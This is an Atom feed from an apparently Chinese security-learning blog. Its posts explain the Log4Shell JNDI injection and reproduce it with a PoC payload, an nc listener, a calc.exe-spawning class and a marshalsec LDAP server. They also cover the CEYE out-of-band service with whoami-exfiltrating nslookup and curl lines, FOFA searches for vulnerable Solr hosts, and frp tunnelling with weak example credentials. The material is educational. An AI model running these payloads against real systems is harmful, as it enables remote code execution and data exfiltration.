<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="https://dzxindex.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://dzxindex.github.io/" rel="alternate" type="text/html" /><updated>2021-12-14T17:48:00+08:00</updated><id>https://dzxindex.github.io/feed.xml</id><title type="html">学习博客</title><subtitle>安全&amp;代码 学习博客</subtitle><author><name>Zhuang Ma</name></author><entry><title type="html">log4j2 一个JAVA的大漏洞</title><link href="https://dzxindex.github.io/2021/12/14/CVE-log4j2/" rel="alternate" type="text/html" title="log4j2 一个JAVA的大漏洞" /><published>2021-12-14T00:00:00+08:00</published><updated>2021-12-14T00:00:00+08:00</updated><id>https://dzxindex.github.io/2021/12/14/CVE-log4j2</id><content type="html" xml:base="https://dzxindex.github.io/2021/12/14/CVE-log4j2/">&lt;h1 id=&quot;log4j2-网络安全史册上的漏洞&quot;&gt;log4j2 网络安全史册上的漏洞&lt;/h1&gt;

&lt;p&gt;不管是什么编程语言，不管是前端后端还是客户端，对打日志都不会陌生。&lt;/p&gt;

&lt;p&gt;通过日志，可以帮助我们了解程序的运行情况，排查程序运行中出现的问题。&lt;/p&gt;

&lt;p&gt;在Java技术栈中，用的比较多的日志输出框架主要是 log4j2 和 logback 。&lt;/p&gt;

&lt;p&gt;今天讨论的主角就是 log4j2。&lt;/p&gt;

&lt;p&gt;我们经常会在日志中输出一些变量，比如：&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
logger.info(&quot;client ip: {}&quot;, clientIp)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;现在思考一个问题：&lt;/p&gt;

&lt;p&gt;假如现在想要通过日志输出一个Java对象，但这个对象不在程序中，而是在其他地方，比如可能在某个文件中，甚至可能在网络上的某个地方，这种时候怎么办呢？&lt;/p&gt;

&lt;p&gt;log4j2 的强大之处在于,除了可以输出程序中的变量,它还提供了一个叫 Lookup 的东西,可以用来输出更多内容：&lt;/p&gt;

&lt;p&gt;lookup，顾名思义就是查找、搜索的意思，那在log4j2中，就是允许在输出日志的时候，通过某种方式去查找要输出的内容。&lt;/p&gt;

&lt;h2 id=&quot;一背景&quot;&gt;一、背景&lt;/h2&gt;

&lt;h3 id=&quot;jndi-是什么&quot;&gt;JNDI 是什么?&lt;/h3&gt;

&lt;p&gt;JNDI即 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Java Naming and Directory Interface&lt;/code&gt;（JAVA命名和目录接口），它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。&lt;/p&gt;

&lt;p&gt;看不懂？看不懂就对了！&lt;/p&gt;

&lt;p&gt;简单粗暴理解：有一个类似于字典的数据源，你可以通过JNDI接口，传一个name进去，就能获取到对象了。&lt;/p&gt;

&lt;p&gt;那不同的数据源肯定有不同的查找方式，所以JNDI也只是一个上层封装，在它下面也支持很多种具体的数据源。&lt;/p&gt;

&lt;h4 id=&quot;ldap-与-jndi-关系&quot;&gt;LDAP 与 JNDI 关系？&lt;/h4&gt;

&lt;p&gt;继续把目光聚焦，咱们只看这个叫LDAP的东西。&lt;/p&gt;

&lt;p&gt;LDAP 即 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Lightweight Directory Access Protocol&lt;/code&gt;（轻量级目录访问协议），目录是一个为查询、浏览和搜索而优化的专业分布式数据库，它呈树状结构组织数据，就好象Linux/Unix系统中的文件目录一样。目录数据库和关系数据库不同，它有优异的读性能，但写性能差，并且没有事务处理、回滚等复杂功能，不适于存储修改频繁的数据。所以目录天生是用来查询的，就好像它的名字一样。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/security/JNDI.jpg#pic_center&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;看不懂？看不懂就对了！&lt;/p&gt;

&lt;p&gt;这个东西用在统一身份认证领域比较多，但今天也不是这篇文章的重点。你只需要简单粗暴理解：&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;有一个类似于字典的数据源，你可以通过LDAP协议，传一个name进去，就能获取到数据。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;二漏洞原理&quot;&gt;二、漏洞原理&lt;/h2&gt;

&lt;p&gt;好了，有了以上的基础，再来理解这个漏洞就很容易了。&lt;/p&gt;

&lt;p&gt;假如某一个Java程序中，将浏览器的类型记录到了日志中：&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;String userAgent = request.getHeader(&quot;User-Agent&quot;);
logger.info(userAgent);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;网络安全中有一个准则：&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;不要信任用户输入的任何信息&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;这其中，User-Agent就属于外界输入的信息，而不是自己程序里定义出来的。只要是外界输入的，就有可能存在恶意的内容。&lt;/p&gt;

&lt;p&gt;假如有人发来了一个HTTP请求，他的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;User-Agent&lt;/code&gt; 是这样一个字符串：&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;${jndi:ldap://127.0.0.1/exploit}&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;接下来，log4j2将会对这行要输出的字符串进行解析。&lt;/p&gt;

&lt;p&gt;首先，它发现了字符串中有 ${}，知道这个里面包裹的内容是要单独处理的。&lt;/p&gt;

&lt;p&gt;进一步解析，发现是JNDI扩展内容。&lt;/p&gt;

&lt;p&gt;再进一步解析，发现了是LDAP协议，LDAP服务器在127.0.0.1，要查找的key是exploit。&lt;/p&gt;

&lt;p&gt;最后，调用具体负责LDAP的模块去请求对应的数据。&lt;/p&gt;

&lt;p&gt;如果只是请求普通的数据，那也没什么，但问题就出在还可以请求Java对象！&lt;/p&gt;

&lt;p&gt;Java对象一般只存在于内存中，但也可以通过 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;序列化&lt;/code&gt; 的方式将其存储到文件中，或者通过网络传输。&lt;/p&gt;

&lt;p&gt;如果是自己定义的序列化方式也还好，但更危险的在于：JNDI还支持一个叫命名引用（Naming References）的方式，可以通过远程下载一个class文件，然后下载后加载起来构建对象&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;PS：有时候Java对象比较大，直接通过LDAP这些存储不方便，就整了个类似于二次跳转的意思，不直接返回对象内容，而是告诉你对象在哪个class里，让你去那里找。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;注意，这里就是核心问题了：&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JNDI可以远程下载class文件来构建对象！！！。&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;危险在哪里？&lt;/p&gt;

&lt;p&gt;如果远程下载的URL指向的是一个黑客的服务器，并且下载的class文件里面藏有恶意代码，那不就完犊子了吗？&lt;/p&gt;

&lt;p&gt;还没看懂？没关系，我画了一张图：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/posts/security/JNDI_exp.jpg#pic_center&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;这就是鼎鼎大名的JNDI注入攻击！&lt;/p&gt;

&lt;p&gt;其实除了LDAP，还有RMI的方式，有兴趣的可以了解下。&lt;/p&gt;

&lt;h3 id=&quot;jndi-注入&quot;&gt;JNDI 注入&lt;/h3&gt;

&lt;p&gt;其实这种攻击手法不是这一次出现了，早在2016的blackhat大会上，就有大佬披露了这种攻击方式。&lt;/p&gt;

&lt;p&gt;回过头来看，问题的核心在于：&lt;/p&gt;

&lt;p&gt;Java允许通过JNDI远程去下载一个class文件来加载对象，如果这个远程地址是自己的服务器，那还好说，如果是可以被外界来指定的地址，那就要出大问题！&lt;/p&gt;

&lt;p&gt;前面的例子中，一直用的127.0.0.1来代替LDAP服务器地址，那如果输入的User-Agent字符串中不是这个地址，而是一个恶意服务器地址呢？&lt;/p&gt;

&lt;h2 id=&quot;三影响范围&quot;&gt;三、影响范围&lt;/h2&gt;

&lt;h3 id=&quot;影响规模&quot;&gt;影响规模&lt;/h3&gt;

&lt;p&gt;这一次漏洞的影响面之所以如此之大，主要还是log4j2的使用面实在是太广了。&lt;/p&gt;

&lt;p&gt;一方面现在Java技术栈在Web、后端开发、大数据等领域应用非常广泛，国内除了阿里巴巴、京东、美团等一大片以Java为主要技术栈的公司外，还有多如牛毛的中小企业选择Java。&lt;/p&gt;

&lt;p&gt;可能的受影响应用包括但不限于如下：
Apache Struts2、Apache Solr、Apache Flink、Apache Druid、ElasticSearch、flume、dubbo、Redis、logstash、kafka&lt;/p&gt;

&lt;h3 id=&quot;影响版本&quot;&gt;影响版本&lt;/h3&gt;

&lt;p&gt;此次受影响版本如下：&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Log4j2版本&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;是否受影响&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;2.x&amp;lt;=2.14.1&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;是&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;四修复方案&quot;&gt;四、修复方案&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;紧急缓解措施&lt;/li&gt;
&lt;/ol&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;（1） 修改jvm参数 -Dlog4j2.formatMsgNoLookups=true     
（2） 修改配置log4j2.formatMsgNoLookups=True
（3） 将系统环境变量 FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS 设置为 true
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h2 id=&quot;五漏洞复现&quot;&gt;五、漏洞复现&lt;/h2&gt;

&lt;h3 id=&quot;poc验证&quot;&gt;POC验证&lt;/h3&gt;

&lt;p&gt;1.添加log4j2相关jar包（maven）&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;dependency&amp;gt;
    &amp;lt;groupId&amp;gt;org.apache.logging.log4j&amp;lt;/groupId&amp;gt;
    &amp;lt;artifactId&amp;gt;log4j-api&amp;lt;/artifactId&amp;gt;
    &amp;lt;version&amp;gt;2.14.1&amp;lt;/version&amp;gt;
&amp;lt;/dependency&amp;gt;
&amp;lt;dependency&amp;gt;
    &amp;lt;groupId&amp;gt;org.apache.logging.log4j&amp;lt;/groupId&amp;gt;
    &amp;lt;artifactId&amp;gt;log4j-core&amp;lt;/artifactId&amp;gt;
    &amp;lt;version&amp;gt;2.14.1&amp;lt;/version&amp;gt;
&amp;lt;/dependency&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;2.POC代码&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Log4jTest {
    public static void main(String[] args) {
        Logger logger = LogManager.getLogger();
	//127.0.0.1:9999 可替换成dnslog平台或vps地址
        logger.error(&quot;${jndi:ldap://127.0.0.1:9999/}&quot;);
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;3.Vps上使用nc开启监听&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# nc -lvvp 9999
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;4.运行java代码&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;有连接信息
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;修改配置log4j2.formatMsgNoLookups=True&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;再次运行代码发现nc没有连接信息，缓解措施有效&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;exploit-执行calc命令&quot;&gt;Exploit 执行calc命令&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;编写ExpCalc.java&lt;/li&gt;
&lt;/ol&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public class ExpCalc{
    public ExpCalc() throws Exception {
        Runtime.getRuntime().exec(new String[]{&quot;cmd.exe&quot;,&quot;/c&quot;, &quot;calc.exe&quot;});
    }

    public static void main(String[] args) throws Exception {
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;2.编译class文件放到服务器上&lt;/p&gt;

&lt;p&gt;javac ExpCalc.java&lt;/p&gt;

&lt;p&gt;可以使用python3搭建httpserver
python3  -m  http.server 9999&lt;/p&gt;

&lt;p&gt;3.使用marshalsec生成jndi服务&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;java		-cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:9999/#ExpCalc
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;4.运行payload，即可执行命令，弹出计算器&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;logger.error(&quot;${jndi:ldap://127.0.0.1:9999/ExpCalc}&quot;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;注意&quot;&gt;注意！！！&lt;/h2&gt;

&lt;p&gt;仅供学习参考,禁止传播！！！ 作者概不负责&lt;/p&gt;

&lt;h2 id=&quot;转载&quot;&gt;转载&lt;/h2&gt;

&lt;p&gt;https://zhuanlan.zhihu.com/p/444103520&lt;/p&gt;</content><author><name>Zhuang Ma</name></author><category term="安全漏洞" /><category term="JAVA" /><summary type="html">log4j2 网络安全史册上的漏洞</summary></entry><entry><title type="html">FOFA介绍</title><link href="https://dzxindex.github.io/2021/12/14/fofa-search/" rel="alternate" type="text/html" title="FOFA介绍" /><published>2021-12-14T00:00:00+08:00</published><updated>2021-12-14T00:00:00+08:00</updated><id>https://dzxindex.github.io/2021/12/14/fofa-search</id><content type="html" xml:base="https://dzxindex.github.io/2021/12/14/fofa-search/">&lt;h1 id=&quot;fofa介绍&quot;&gt;FOFA介绍&lt;/h1&gt;

&lt;p&gt;&lt;a href=&quot;https://fofa.so/&quot;&gt;FOFA&lt;/a&gt; 是一款非常强大的搜索引擎，FOFA（网络空间资产检索系统）是世界上数据覆盖更完整的IT设备搜索引擎，拥有全球联网IT设备更全的DNA信息。&lt;/p&gt;

&lt;h2 id=&quot;fofa基础语法&quot;&gt;FOFA基础语法&lt;/h2&gt;

&lt;h3 id=&quot;1-title网站标题&quot;&gt;1. title网站标题&lt;/h3&gt;

&lt;p&gt;title=”beijing” 从标题中搜索“北京”&lt;/p&gt;

&lt;h3 id=&quot;2-body页面内容&quot;&gt;2. body页面内容&lt;/h3&gt;

&lt;p&gt;body可以通过页面中包含的特定字符串来搜索资产。&lt;/p&gt;

&lt;h3 id=&quot;3-domain域名&quot;&gt;3. domain域名&lt;/h3&gt;

&lt;p&gt;搜索域名中包含http://xuegod.cn的资产，此方法相当于子域名的搜索。&lt;/p&gt;

&lt;p&gt;domain=”http://xuegod.cn”&lt;/p&gt;

&lt;h3 id=&quot;4-地区搜索&quot;&gt;4. 地区搜索&lt;/h3&gt;
&lt;p&gt;country=”CN” 搜索指定国家(编码)的资产。&lt;/p&gt;

&lt;p&gt;region=”Xinjiang” 搜索指定行政区的资产&lt;/p&gt;

&lt;p&gt;city=”beijing” 搜索指定城市的资产。&lt;/p&gt;

&lt;p&gt;排除地区方法使用 !=&lt;/p&gt;

&lt;p&gt;country=”CN” 搜索指定国家(编码)的资产。&lt;/p&gt;

&lt;p&gt;region=”Xinjiang” 搜索指定行政区的资产&lt;/p&gt;

&lt;p&gt;city=”beijing” 搜索指定城市的资产。&lt;/p&gt;

&lt;p&gt;排除地区方法使用 !=&lt;/p&gt;

&lt;h2 id=&quot;漏洞搜索&quot;&gt;漏洞搜索&lt;/h2&gt;

&lt;p&gt;举个例子：
Apache solr XML 实体注入漏洞&lt;/p&gt;

&lt;p&gt;fofa搜索：&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;app=&quot;Solr&quot; &amp;amp;&amp;amp; port=&quot;8983&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Zhuang Ma</name></author><category term="FOFA" /><category term="信息收集" /><summary type="html">FOFA介绍</summary></entry><entry><title type="html">CEYE平台的使用</title><link href="https://dzxindex.github.io/2021/12/14/security-CEYE/" rel="alternate" type="text/html" title="CEYE平台的使用" /><published>2021-12-14T00:00:00+08:00</published><updated>2021-12-14T00:00:00+08:00</updated><id>https://dzxindex.github.io/2021/12/14/security-CEYE</id><content type="html" xml:base="https://dzxindex.github.io/2021/12/14/security-CEYE/">&lt;h1 id=&quot;ceye-是什么&quot;&gt;CEYE 是什么&lt;/h1&gt;

&lt;p&gt;CEYE是一个用来检测带外（Out-of-Band）流量的监控平台，如DNS查询和HTTP请求。它可以帮助安全研究人员在测试漏洞时收集信息（例如SSRF / XXE / RFI / RCE）。&lt;/p&gt;

&lt;h2 id=&quot;ceye的使用场景&quot;&gt;CEYE的使用场景&lt;/h2&gt;

&lt;p&gt;漏洞检测或漏洞利用需要进一步的用户或系统交互。&lt;/p&gt;

&lt;p&gt;一些漏洞类型没有直接表明攻击是成功的。如Payload触发了却不在前端页面显示。&lt;/p&gt;

&lt;p&gt;这时候使用CEYE平台，通过使用诸如DNS和HTTP之类的带外信道，便可以得到回显信息。&lt;/p&gt;

&lt;h2 id=&quot;ceye如何使用&quot;&gt;CEYE如何使用&lt;/h2&gt;

&lt;p&gt;登录 CEYE.IO，在 &lt;a href=&quot;http://ceye.io/profile&quot;&gt;用户详情页&lt;/a&gt; 可以看到自己的域名标识符 identifier，对于每个用户，都有唯一的域名标识符 如 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;abcdef.ceye.io&lt;/code&gt; 。所有来自于 abcdef.ceye.io 或 *.abcdef.ceye.io 的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DNS查询和HTTP请求&lt;/code&gt;都会被记录。通过查看这些记录信息，安全研究人员可以确认并改进自己的漏洞研究方案。&lt;/p&gt;

&lt;p&gt;DNS查询可以以多种不同的方式进行解析。CEYE.IO平台提供了一台DNS Server来解析域名。它的 nameserver address 被设置为自己的服务器IP，因此所有关于ceye.io 的域名的DNS查询最终都会被发送到CEYE的DNS服务器。&lt;/p&gt;

&lt;h3 id=&quot;使用例子-nslookup&quot;&gt;使用例子-nslookup&lt;/h3&gt;
&lt;p&gt;nslookup&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; nslookup `whoami`.abcdef.ceye.io

Server:        127.1.1.1
Address:    127.1.1.1#53

Non-authoritative answer:
Name:    chan.abcdef.ceye.io
Address: 118.192.48.48
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;使用例子-http&quot;&gt;使用例子-http&lt;/h3&gt;
&lt;p&gt;curl -X POST http://ip.port.abcdef.ceye.io/&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whoami&lt;/code&gt;?p=http -d data=http&lt;/p&gt;

&lt;h2 id=&quot;参考&quot;&gt;参考&lt;/h2&gt;

&lt;p&gt;https://www.cnblogs.com/zhaijiahui/p/9160913.html&lt;/p&gt;</content><author><name>Zhuang Ma</name></author><category term="安全" /><summary type="html">CEYE 是什么</summary></entry><entry><title type="html">Goland debug 模式更新</title><link href="https://dzxindex.github.io/2021/12/03/Goland-change-dlv-copy/" rel="alternate" type="text/html" title="Goland debug 模式更新" /><published>2021-12-03T00:00:00+08:00</published><updated>2021-12-03T00:00:00+08:00</updated><id>https://dzxindex.github.io/2021/12/03/Goland-change-dlv%20copy</id><content type="html" xml:base="https://dzxindex.github.io/2021/12/03/Goland-change-dlv-copy/">&lt;h1 id=&quot;问题描述&quot;&gt;问题描述&lt;/h1&gt;
&lt;p&gt;Golang无法debug原因，Golang delve 版本太低，需更新&lt;/p&gt;

&lt;h1 id=&quot;解决方法&quot;&gt;解决方法&lt;/h1&gt;

&lt;ol&gt;
  &lt;li&gt;降级GO版本&lt;/li&gt;
  &lt;li&gt;升级Goland 版本&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;其他解决方法&quot;&gt;其他解决方法&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;直接打开cmd操作，不要在项目内
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;go get github.com/go-delve/delve/cmd/dlv&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;blockquote&gt;
  &lt;p&gt;ps:如果操作有问题，可以参看作者的文档：https://github.com/derekparker/delve/blob/master/Documentation/installation/windows/install.md&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;找到下载的delve，默认存放的地址是：%GOROOT%/bin/delve/dlv.exe&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;设置Goland
依次打开：Help-&amp;gt;Edit Customer Properties；若提示文件不存在，点击创建即可&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;在文件中新增：&lt;/p&gt;
    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dlv.path=你的dlv路径（windows的路径需要转义）
ps:
dlv.path=C:/Go/bin/dlv.exe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;blockquote&gt;
  &lt;p&gt;ps windows路径需要转义&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ol&gt;
  &lt;li&gt;最后重启Goland即可（刚配置好后的第一次重启会比较慢）&lt;/li&gt;
&lt;/ol&gt;</content><author><name>Zhuang Ma</name></author><category term="cate1" /><category term="cate2" /><summary type="html">问题描述 Golang无法debug原因，Golang delve 版本太低，需更新</summary></entry><entry><title type="html">how-to-use-frp</title><link href="https://dzxindex.github.io/2021/12/01/frp-how-to-use-frp/" rel="alternate" type="text/html" title="how-to-use-frp" /><published>2021-12-01T00:00:00+08:00</published><updated>2021-12-01T00:00:00+08:00</updated><id>https://dzxindex.github.io/2021/12/01/frp-how-to-use-frp</id><content type="html" xml:base="https://dzxindex.github.io/2021/12/01/frp-how-to-use-frp/">&lt;h1 id=&quot;为什么需要内网穿透&quot;&gt;为什么需要内网穿透？&lt;/h1&gt;

&lt;p&gt;如果公司的内网不给提供外网访问，或者没有给分配外网可以访问的IP，我们又需要访问SSH登录内网的服务器，远程桌面、远程文件我们该怎么办？
远程桌面使用TeamViewer，但需要访问端也拥有TeamViewer软件，不方便。且TeamViewer不易实现远程文件访问。
使用蒲公英相关的拨号软件进行组网，可用，但免费版本网络速度极慢，体验不佳，几乎无法正常使用。
使用花生壳软件进行DNS解析，可用，但同第二点所述，免费版本有带宽限制，无法实际使用。&lt;/p&gt;

&lt;p&gt;那么上述的场景怎么既简单又高效的实现内网穿透呢？高效的frp是一个不错的选择。&lt;/p&gt;

&lt;h1 id=&quot;frp的作用&quot;&gt;frp的作用&lt;/h1&gt;

&lt;ol&gt;
  &lt;li&gt;利用处于内网或防火墙后的机器，对外网环境提供 http 或 https 服务。&lt;/li&gt;
  &lt;li&gt;对于 http, https 服务支持基于域名的虚拟主机，支持自定义域名绑定，使多个域名可以共用一个80端口。&lt;/li&gt;
  &lt;li&gt;利用处于内网或防火墙后的机器，对外网环境提供 tcp 和 udp 服务，例如在家里通过 ssh 访问处于公司内网环境内的主机。&lt;/li&gt;
&lt;/ol&gt;

&lt;h1 id=&quot;安装&quot;&gt;安装&lt;/h1&gt;

&lt;p&gt;下载：&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wget https://github.com/fatedier/frp/releases/download/v0.22.0/frp_0.22.0_linux_amd64.tar.gz&lt;/code&gt;&lt;/p&gt;

&lt;h1 id=&quot;服务端设置&quot;&gt;服务端设置&lt;/h1&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# vim frps.ini

[common]
bind_port = 7000
dashboard_port = 7500
token = 12345678
dashboard_user = admin
dashboard_pwd = admin
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;frps 服务端启动程序&lt;/li&gt;
  &lt;li&gt;frps.ini 服务端配置文件&lt;/li&gt;
  &lt;li&gt;frps_full.ini 服务端全量配置文件&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;运行&quot;&gt;运行&lt;/h2&gt;

&lt;p&gt;编辑保存完成以后，此时我们可以运行一下，执行以下命令运行。&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./frps -c frps.ini

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;客户端设置&quot;&gt;客户端设置&lt;/h1&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# vim frpc.ini
[common]
server_addr = 49.233.169.171
server_port = 7000
token = 12345678

[ssh]
type = tcp
local_ip = 127.0.0.1
local_port = 22
remote_port = 8001 # 本地监听端口

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;ul&gt;
  &lt;li&gt;server_addr就是你公网服务器的IP。&lt;/li&gt;
  &lt;li&gt;server_port服务端设置的端口。&lt;/li&gt;
  &lt;li&gt;token跟服务端设置的token保持一致即可。&lt;/li&gt;
  &lt;li&gt;type为代理的类型，SSH服务设置为tcp类型。&lt;/li&gt;
  &lt;li&gt;local_ip为本地IP。&lt;/li&gt;
  &lt;li&gt;local_port为内网客户端设置的SSH端口。&lt;/li&gt;
  &lt;li&gt;remote_port为内网提供给外网访问的服务端口。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;运行-1&quot;&gt;运行&lt;/h2&gt;

&lt;p&gt;放在/app 目录下&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/app/frp/frpc -c /app/frp/frps.ini
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;frp后台运行&quot;&gt;frp后台运行&lt;/h2&gt;
&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nohup /app/frp/frpc -c /app/frp/frps.ini &amp;amp;&lt;/code&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;进入虚拟机操作，不能通过ssh软件&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;客户端连接&quot;&gt;客户端连接&lt;/h1&gt;

&lt;p&gt;&lt;strong&gt;ssh -p 客户端端口 用户@IP&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh -p 本地监听端口 用户名@服务端IP
如：
ssh -p 8001 root@119.96.220.225
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;参考&quot;&gt;参考&lt;/h1&gt;
